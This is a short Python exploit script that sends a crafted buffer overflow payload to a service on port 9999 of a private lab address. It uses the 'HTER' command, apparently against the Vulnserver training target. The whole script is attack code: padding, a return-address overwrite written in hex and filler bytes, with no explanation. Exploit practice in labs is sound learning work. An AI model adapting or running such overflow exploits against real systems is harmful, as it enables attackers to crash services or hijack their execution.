import socket, sys
from time import sleep
payload=b""
payload+=b"A"*2041
payload+=b"AF115062" #\xaf\x11\x50\x62"
payload+=b"D"*(5000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
